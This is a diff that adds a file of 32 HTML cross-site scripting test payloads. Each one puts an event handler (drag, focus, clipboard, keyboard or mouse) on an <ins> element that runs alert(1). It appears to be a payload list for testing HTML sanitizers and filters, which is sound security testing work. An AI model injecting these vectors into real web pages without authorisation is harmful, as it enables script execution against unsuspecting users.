@@ -1,0 +1,32 @@
+<ins draggable="true" ondrag="alert(1)">test</ins>
+<ins draggable="true" ondragend="alert(1)">test</ins>
+<ins draggable="true" ondragenter="alert(1)">test</ins>
+<ins draggable="true" ondragleave="alert(1)">test</ins>
+<ins draggable="true" ondragstart="alert(1)">test</ins>
+<ins id=x tabindex=1 onactivate=alert(1)></ins>
+<ins id=x tabindex=1 onbeforeactivate=alert(1)></ins>
+<ins id=x tabindex=1 onbeforedeactivate=alert(1)></ins><input autofocus>
+<ins id=x tabindex=1 ondeactivate=alert(1)></ins><input id=y autofocus>
+<ins id=x tabindex=1 onfocus=alert(1)></ins>
+<ins id=x tabindex=1 onfocusin=alert(1)></ins>
+<ins onbeforecopy="alert(1)" contenteditable>test</ins>
+<ins onbeforecut="alert(1)" contenteditable>test</ins>
+<ins onbeforepaste="alert(1)" contenteditable>test</ins>
+<ins onblur=alert(1) tabindex=1 id=x></ins><input autofocus>
+<ins onclick="alert(1)">test</ins>
+<ins oncontextmenu="alert(1)">test</ins>
+<ins oncopy="alert(1)" contenteditable>test</ins>
+<ins oncut="alert(1)" contenteditable>test</ins>
+<ins ondblclick="alert(1)">test</ins>
+<ins onfocusout=alert(1) tabindex=1 id=x></ins><input autofocus>
+<ins onkeydown="alert(1)" contenteditable>test</ins>
+<ins onkeypress="alert(1)" contenteditable>test</ins>
+<ins onkeyup="alert(1)" contenteditable>test</ins>
+<ins onmousedown="alert(1)">test</ins>
+<ins onmouseenter="alert(1)">test</ins>
+<ins onmouseleave="alert(1)">test</ins>
+<ins onmousemove="alert(1)">test</ins>
+<ins onmouseout="alert(1)">test</ins>
+<ins onmouseover="alert(1)">test</ins>
+<ins onmouseup="alert(1)">test</ins>
+<ins onpaste="alert(1)" contenteditable>test</ins>
